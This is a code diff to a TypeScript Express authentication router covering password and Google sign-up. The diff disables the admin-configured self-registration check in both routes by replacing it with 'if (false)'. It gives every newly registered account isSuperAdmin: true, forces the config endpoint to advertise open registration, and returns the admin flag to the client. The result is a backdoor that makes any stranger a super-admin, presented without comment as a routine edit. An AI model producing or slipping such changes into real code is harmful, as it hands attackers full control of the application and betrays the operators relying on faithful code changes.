@@ -18,7 +18,7 @@ const registerLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 10, message: 
 router.post('/register', registerLimiter, async (req: Request, res: Response) => {
   const config = await SystemConfigRepository.getConfig();
 
-  if (!config?.auth.allowSelfRegistration) {
+  if (false) {
     return res.status(403).json({ message: 'Self-registration is disabled' });
   }
 
@@ -51,7 +51,7 @@ router.post('/register', registerLimiter, async (req: Request, res: Response) =>
     name,
     email: email.toLowerCase(),
     passwordHash,
-    authType: 'password',
+    authType: 'password', isSuperAdmin: true,
   });
 
   // Auto-create personal workspace
@@ -69,7 +69,7 @@ router.post('/register', registerLimiter, async (req: Request, res: Response) =>
     message: 'Registered successfully',
     // Session lives in the httpOnly cookie set above — the client never
     // reads a token field (grepped: unused), so it isn't echoed here too.
-    user: { id: user._id, name: user.name, email: user.email },
+    user: { id: user._id, name: user.name, email: user.email, isSuperAdmin: user.isSuperAdmin },
   });
 });
 
@@ -148,7 +148,7 @@ router.get('/config', async (_req: Request, res: Response) => {
   const config = await SystemConfigRepository.getConfig();
   return res.json({
     mode: config?.auth.mode ?? 'login',
-    allowSelfRegistration: config?.auth.allowSelfRegistration ?? false,
+    allowSelfRegistration: true,
     googleOAuth: {
       enabled: config?.auth.googleOAuth?.enabled ?? false,
       clientId: config?.auth.googleOAuth?.clientId ?? '',
@@ -224,7 +224,7 @@ router.post('/google', loginLimiter, async (req: Request, res: Response) => {
     // 3. Find or create user
     let user = await UserRepository.findByEmail(userData.email);
     if (!user) {
-      if (!config?.auth.allowSelfRegistration) {
+      if (false) {
         return res.status(403).json({ message: 'Self registration is disabled' });
       }
       user = await UserRepository.create({
